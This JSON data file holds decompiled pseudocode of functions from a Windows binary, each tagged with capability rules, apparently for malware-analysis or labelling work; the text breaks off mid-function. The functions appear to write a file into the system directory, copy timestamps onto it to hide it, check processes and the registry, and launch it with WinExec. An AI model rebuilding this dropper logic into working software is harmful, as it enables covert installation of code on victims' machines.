{
    "004010e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004010e0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403760(0x407010);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "004011d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040126b) overlaps instruction at (ram,0x00401266)\n// \n\nuint __cdecl fcn.004011d0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t unaff_EBX;\n    uchar *puVar7;\n    uint *puVar8;\n    uint *puVar9;\n    char *pcVar10;\n    char *pcVar11;\n    bool bVar12;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint var_4h;\n    \n    puVar7 = &stack0xfffffffc;\n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar8 = &var_22fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    var_12ch = 0;\n    puVar8 = &var_12bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar5 = 0xffffffff;\n    pcVar10 = &lpBuffer;\n    do {\n        pcVar11 = pcVar10;\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        pcVar11 = pcVar10 + 1;\n        cVar2 = *pcVar10;\n        pcVar10 = pcVar11;\n    } while (cVar2 != '\\0');\n    uVar5 = ~uVar5;\n    puVar8 = pcVar11 + -uVar5;\n    puVar9 = &var_12ch;\n    for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar5 = uVar5 & 3;\n    bVar12 = (POPCOUNT(uVar5) & 1U) == 0;\n    for (; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    if ((bVar12) || (!bVar12)) {\n        puVar9 = 0x407048;\n        uVar5 = 0xffffffff;\n        cVar2 = '\\0';\n    }\n    else {\n        puVar7 = *0xbf17b43a;\n        cVar2 = -0x30;\n        if (SBORROW4(&var_12bh, 1)) goto code_r0x004012af;\n    }\n    *(unaff_EBX + -0x3fcc0037) = *(unaff_EBX + -0x3fcc0037) + cVar2;\n    do {\n        puVar8 = puVar9;\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        puVar8 = puVar9 + 1;\n        cVar1 = *puVar9;\n        puVar9 = puVar8;\n    } while (cVar2 != cVar1);\n    uVar5 = ~uVar5;\n    iVar4 = -1;\n    pcVar10 = puVar7 + -300;\n    do {\n        pcVar11 = pcVar10;\n        if (iVar4 == 0) break;\n        iVar4 = iVar4 + -1;\n        pcVar11 = pcVar10 + 1;\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar11;\n    } while (cVar2 != cVar1);\n    puVar8 = puVar8 - uVar5;\n    puVar9 = pcVar11 + -1;\n    for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\ncode_r0x004012af:\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(puVar7 + -300, 0, puVar7 + -0x28);\n    iVar4 = *(puVar7 + 0xc);\n    if (iVar4 == -1) {\n        iVar3 = fcn.00403760(*(puVar7 + 8));\n        if (iVar3 == -1) {\n            return 0;\n        }\n    }\n    else {\n        iVar3 = *(puVar7 + -4);\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar3, puVar7 + -0x24, puVar7 + -0x1c, puVar7 + -0x14);\n    if (iVar4 == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return 1;\n}\n",
        "token_count": 1400
    },
    "00401370": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401517) overlaps instruction at (ram,0x00401516)\n// \n// WARNING: Removing unreachable block (ram,0x0040148b)\n// WARNING: Removing unreachable block (ram,0x00401499)\n// WARNING: Removing unreachable block (ram,0x0040149b)\n// WARNING: Removing unreachable block (ram,0x00401455)\n// WARNING: Removing unreachable block (ram,0x00401517)\n\nint32_t __cdecl\nfcn.00401370(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int16_t unaff_DI;\n    uint *puVar6;\n    bool bVar7;\n    uchar auStack576 [264];\n    uint uStack312;\n    uchar *puStack308;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    puStack308 = 0x4013ae;\n    fcn.00403c40(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    bVar7 = unaff_DI == 1;\n    puStack308 = 0x4013d6;\n    fcn.00403c40(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    puVar4 = &stack0xfffffffc;\n    if ((!bVar7) && (puVar4 = &stack0xfffffffc,  bVar7)) {\n        puVar3 = &stack0xfffffecc;\n        puVar4 = &stack0xfffffecc;\n        cVar1 = '\\x10';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar3 = puVar3 + -1;\n            *puVar3 = *puVar6;\n            cVar1 = cVar1 + -1;\n            puStack308 = &stack0xfffffffc;\n        } while ('\\0' < cVar1);\n    }\n    fcn.00403c40(arg_18h, arg_1ch, *(puVar4 + 0x10), 0x20, arg_20h + 0xa0);\n    fcn.00403c40(arg_18h, arg_1ch, *(puVar4 + 0x14), 0x20, arg_20h + 0xe0);\n    iVar2 = fcn.00401320();\n    if (iVar2 == -1) {\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        iVar5 = *(puVar4 + 0x20);\n        *(iVar5 + 0x120) = iVar2 % 5;\n    }\n    else {\n        iVar5 = *(puVar4 + 0x20);\n        *(iVar5 + 0x120) = iVar2;\n    }\n    puVar4[-0x10c] = 0;\n    puVar6 = puVar4 + -0x10b;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar4 + -4) = 0x104;\n    *(puVar6 + 2) = 0;\n    iVar2 = fcn.00403fd0(0x80000001, 0x407258, 0x407284, puVar4 + -8, puVar4 + -0x10c, puVar4 + -4);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar4 + -0x10c, 0x4072d4);\n        if (iVar2 == 0) {\n            if ((-1 < iVar2) && (-1 >= iVar2)) {\n                out(0xc4, 0);\n                *(puVar6 + 3) = 0;\n            }\n            *(iVar5 + 0x120) = *(iVar5 + 0x120) | 0x80;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 1024
    },
    "00401530": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040157b) overlaps instruction at (ram,0x0040157a)\n// \n\nuint32_t fcn.00401530(void)\n\n{\n    uint8_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    char extraout_CH;\n    char extraout_CH_00;\n    char cVar4;\n    char extraout_CH_01;\n    uint32_t unaff_EBX;\n    uchar *puVar5;\n    int32_t unaff_EDI;\n    uint *puVar6;\n    uchar uVar7;\n    ulong uVar8;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uint var_1fh;\n    \n    puVar5 = &stack0xfffffffc;\n    iVar3 = unaff_EDI;\n    uVar8 = fcn.00402740();\n    uVar7 = (POPCOUNT(uVar8 & 0xff) & 1U) == 0;\n    if (uVar8 == 0) {\n        return 0;\n    }\n    if ((uVar7) || (!uVar7)) {\n        puVar2 = fcn.00402d90();\n        cVar4 = extraout_CH_00;\n    }\n    else {\n        puVar2 = (uVar8 >> 0x20) + 1;\n        puVar5 = *0xe817b43a;\n        *puVar2 = *puVar2 & unaff_EBX;\n        *puVar2 = *puVar2 + puVar2;\n        uVar7 = (POPCOUNT(*puVar2) & 1U) == 0;\n        cVar4 = extraout_CH;\n    }\n    if ((uVar7) || (!uVar7)) {\n        unaff_EDI = iVar3;\n        iVar3 = fcn.00402b10(0x407074);\n        if (iVar3 == -1) {\n            fcn.004020c0();\n            *0x423790 = 1;\n            iVar3 = fcn.004010e0();\n            if (iVar3 != 0) {\n                return 0;\n            }\n            puVar5[-0x20] = 0;\n            puVar5[-0x80] = 0;\n            puVar6 = puVar5 + -0x1f;\n            for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n            puVar5[-0x60] = 0;\n            puVar6 = puVar5 + -0x7f;\n            for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n            puVar5[-0x40] = 0;\n            puVar6 = puVar5 + -0x5f;\n            for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n            puVar6 = puVar5 + -0x3f;\n            for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n            iVar3 = fcn.00401830(puVar5 + -0x80, puVar5 + -0x60, puVar5 + -0x20, puVar5 + -0x40);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            iVar3 = fcn.00403920(puVar5 + -0x20);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            iVar3 = fcn.00404d40(puVar5 + -0x80, puVar5 + -0x60, puVar5 + -0x20, puVar5 + -0x40);\n            return iVar3 != 0;\n        }\n        puVar2 = NULL;\n        cVar4 = extraout_CH_01;\n    }\n    puVar2[0x1d] = puVar2[0x1d] - 0x70;\n    uVar1 = *(unaff_EDI + -0x75);\n    *(unaff_EDI + -0x75) = uVar1 >> 5 | uVar1 << 4;\n    return puVar2 + 1 & 0xffffff00 | puVar2 + 1 + cVar4 + 0x83;\n}\n",
        "token_count": 1153
    },
    "00402b10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00402bc9)\n// WARNING: Removing unreachable block (ram,0x00402bd6)\n\nuint __cdecl fcn.00402b10(uint arg_8h)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar3 = (**0x42377c)(2, 0);\n    if (iVar3 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar6 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    iVar4 = (**0x423780)(iVar3, &var_12ch);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        bVar1 = iVar4 == 0;\n        uVar5 = iVar3;\n        if (bVar1) {\ncode_r0x00402be3:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n            return var_4h;\n        }\n        if ((!bVar1) && (bVar1)) {\n            iVar3 = iVar4;\n        }\n        uVar5 = iVar3;\n        iVar4 = (*pcVar2)(0xf4, arg_8h);\n        if (iVar4 == 0) {\n            var_4h = var_124h;\n            goto code_r0x00402be3;\n        }\n        iVar4 = (**0x423784)(uVar5, 0xd0);\n    } while( true );\n}\n",
        "token_count": 461
    },
    "00402f00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f78) overlaps instruction at (ram,0x00402f77)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402f00(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_EDI;\n    bool bVar2;\n    float10 extraout_ST0;\n    uint var_4h;\n    \n    bVar2 = false;\n    *0x42378c = fcn.00404b30();\n    if ((!bVar2) && (bVar2)) {\n        *(unaff_EDI + 0x1c) = extraout_ST0;\n    }\n    arg_ch_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_ch_00 == -1) {\n        return 0;\n    }\n    *(unaff_EBX + 0x458b1055) = *(unaff_EBX + 0x458b1055) | 0xc;\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*0x42378c != 0) {\n        iVar1 = fcn.00402e40(arg_ch_00);\n        *0x42378c = iVar1 == 0;\n    }\n    fcn.004011d0(0, arg_ch_00);\n    if (*0x42378c == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_ch_00);\n    }\n    return 1;\n}\n",
        "token_count": 390
    },
    "00404b30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00404b30(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00403fd0(0x80000002, 0x4072f0, 0x407330, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 152
    },
    "00404c70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404cad)\n// WARNING: Removing unreachable block (ram,0x00404cb7)\n\nuint __cdecl fcn.00404c70(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *unaff_EBP;\n    bool in_OF;\n    uint in_stack_00000018;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_EBP = in_stack_00000018;\n        return in_stack_00000018;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 == -1) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 163
    },
    "00404d40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404f13) overlaps instruction at (ram,0x00404f12)\n// \n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0x00000000 : 0x00404ecf\n// WARNING: Removing unreachable block (ram,0x00404d87)\n// WARNING: Removing unreachable block (ram,0x00404d8e)\n// WARNING: Removing unreachable block (ram,0x00404f93)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * __cdecl fcn.00404d40(uint8_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint **ppuVar2;\n    char cVar4;\n    uint *puVar3;\n    char cVar6;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    int32_t extraout_EDX;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t unaff_EBX;\n    uint *puVar9;\n    uint8_t *puVar10;\n    ushort in_SS;\n    uint8_t in_AF;\n    bool bVar11;\n    uint8_t uVar12;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar13;\n    bool bVar14;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t uVar15;\n    ulong uVar16;\n    uint *puStack552;\n    uchar lpBuffer;\n    uint var_213h;\n    uint *puStack524;\n    uchar s;\n    uint var_10fh;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar13 = false;\n    lpBuffer = 0;\n    puVar3 = &var_213h;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    s = 0;\n    puVar3 = &var_10fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_ch = 0x1;\n    *(puVar3 + 2) = 0;\n    puStack552 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407030, &lpBuffer);\n    uVar12 = 0;\n    bVar11 = (((unaff_EBX ^ arg_8h) >> 8) - 1U & 0xd) == 0;\n    fcn.004034c0(&var_4h);\n    if ((!bVar11) && (bVar11)) {\n        uVar15 = (in_IF & 1) * 0x200;\n        uVar1 = uVar15 | (in_TF & 1) * 0x100;\n        in_NT = ((in_NT & 1) * 0x4000 & 0x4000) != 0;\n        bVar13 = (uVar15 & 0x400) != 0;\n        in_IF = (uVar1 & 0x200) != 0;\n        in_TF = ((uVar1 | (uVar12 & 1) * 0x80) & 0x100) != 0;\n        in_AF = ((in_AF & 1) * '\\x10' & 0x10) != 0;\n        in_ID = (((in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000) & 0x200000) != 0;\n        in_AC = ((in_AC & 1) * 0x40000 & 0x40000) != 0;\n        in_VIP = 0;\n        in_VIF = 0;\n    }\n    iVar5 = fcn.00403540(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar5 == 0) {\n        return NULL;\n    }\n    iVar5 = fcn.00402f00(&s, var_4h, var_8h);\n    if (iVar5 == 0) {\n        return NULL;\n    }\n    fcn.00404bc0();\n    iVar5 = fcn.00402b10(0x407068);\n    if (iVar5 == -1) {\n        iVar5 = fcn.00402b10(0x40705c);\n        bVar11 = SBORROW4(iVar5, -1);\n        if (iVar5 == -1) goto code_r0x00404ee5;\n    }\n    iVar5 = fcn.00402840(arg_8h);\n    if (iVar5 != 0) {\n        fcn.00403010();\n        fcn.00403fc0();\n        return 0x1;\n    }\n    bVar11 = false;\n    if (*0x42378c == 0) {\n        return NULL;\n    }\ncode_r0x00404ee5:\n    if ((!bVar11) && (bVar11)) {\n        *puStack552 = puStack524;\n        return puStack524;\n    }\n    while( true ) {\n        uVar16 = fcn.00404cd0(arg_8h, &s);\n        puVar3 = var_ch;\n        if (uVar16 == 0) {\n            puVar3 = NULL;\n        }\n        bVar11 = (POPCOUNT(puVar3 & 0xff) & 1U) == 0;\n        iVar5 = extraout_ECX;\n        if (puVar3 != NULL) {\n            puVar10 = arg_8h + bVar13 * -2 + 1;\n            uVar12 = uVar16;\n            cVar4 = uVar12 - *arg_8h;\n            uVar15 = (in_NT & 1) * 0x4000 | SBORROW1(uVar12, *arg_8h) * 0x800 | bVar13 * 0x400 | (in_IF & 1) * 0x200 |\n                     (in_TF & 1) * 0x100 | (cVar4 < '\\0') * 0x80 | (cVar4 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                     ((POPCOUNT(cVar4) & 1U) == 0) * 4 | uVar12 < *arg_8h | (in_ID & 1) * 0x200000 |\n                     (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n            func_0x1018aeaa();\n            uVar16 = fcn.004016b0(uVar15);\n            puVar9 = uVar16;\n            bVar11 = (POPCOUNT(puVar9 & 0xff) & 1U) == 0;\n            iVar5 = extraout_ECX_00;\n            puVar3 = puVar3 + -1;\n            arg_8h = puVar10;\n            if (puVar9 == NULL) {\n                var_ch = NULL;\n                puVar3 = puVar9;\n            }\n        }\n        if ((!bVar11) && (bVar11)) {\n            puVar9 = segment(in_SS, *0x10 + -0x228);\n            if (bVar11) {\n                return *puVar9;\n            }\n            uVar16 = CONCAT44(0xb7bc9ea5, *puVar9);\n            puStack552 = 0xb7bc9ea5;\n        }\n        bVar14 = false;\n        bVar11 = puVar3 == NULL;\n        ppuVar2 = puVar3;\n        if (bVar11) {\n            uVar16 = fcn.00402870(arg_8h, 0);\n            puVar3 = uVar16;\n            bVar14 = SCARRY4(&stack0xfffffdd0, 8);\n            iVar5 = extraout_ECX_01;\n            ppuVar2 = &puStack552;\n            var_ch = puVar3;\n        }\n        iVar7 = uVar16 >> 0x20;\n        if ((bVar11 && *0x10 == 0x228 || bVar14 != ppuVar2 < 0) ||\n           ((!bVar11 || *0x10 != 0x228) && bVar14 == ppuVar2 < 0)) break;\n        in_AF = 9 < (uVar16 & 0xf) | in_AF;\n        if (iVar5 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    bVar11 = false;\n    ppuVar2 = puVar3;\n    if (puVar3 != NULL) {\n        fcn.00403fc0();\n        bVar11 = 0xfffffffb < &stack0xfffffdd4;\n        iVar7 = extraout_EDX;\n        ppuVar2 = &puStack552;\n    }\n    bVar14 = (POPCOUNT(ppuVar2 & 0xff) & 1U) == 0;\n    if ((!bVar11) && (bVar11)) {\n        bVar14 = (POPCOUNT(unaff_EBX + *(unaff_EBX + 0x69 + iVar7 * 4) + bVar11 & 0xff) & 1U) == 0;\n    }\n    uVar16 = (*_sym.imp.KERNEL32.dll_Sleep)();\n    pcVar8 = uVar16 >> 0x20;\n    iVar5 = uVar16;\n    if ((bVar14) || (!bVar14)) {\n        (*_sym.imp.KERNEL32.dll_WinExec)(0x40707c);\n        puVar9 = puVar3;\n    }\n    else {\n        puVar9 = puVar3 + bVar13 * -2 + 1;\n        out(*puVar3, uVar16 >> 0x20);\n        do {\n            cVar4 = iVar5 >> 8;\n            in_AF = 9 < (iVar5 & 0xf) | in_AF;\n            iVar5 = CONCAT31(CONCAT21(iVar5 >> 0x10, cVar4 - in_AF), -in_AF);\n        } while (in_AF || cVar4 == *pcVar8);\n        *(arg_8h + pcVar8 * 2) = (*(arg_8h + pcVar8 * 2) + 0x7b) - in_AF;\n        *(extraout_ECX_02 + 0x6a) = iVar5;\n        pcVar8 = iVar5 + 0x7c;\n        cVar4 = *pcVar8;\n        cVar6 = extraout_ECX_02 >> 8;\n        *pcVar8 = *pcVar8 + cVar6;\n        if (SCARRY1(cVar4, cVar6)) {\n    // WARNING: Could not recover jumptable at 0x00405024. Too many branches\n    // WARNING: Treating indirect jump as call\n            puVar3 = (**(iVar5 + -0x40))();\n            return puVar3;\n        }\n    }\n    return puVar9;\n}\n",
        "token_count": 2710
    },
    "00403040": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00403040(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x423790 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004026e0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e4, acStack1304, &uStack2112);\n    uStack2088 = 0x40736c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407384;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    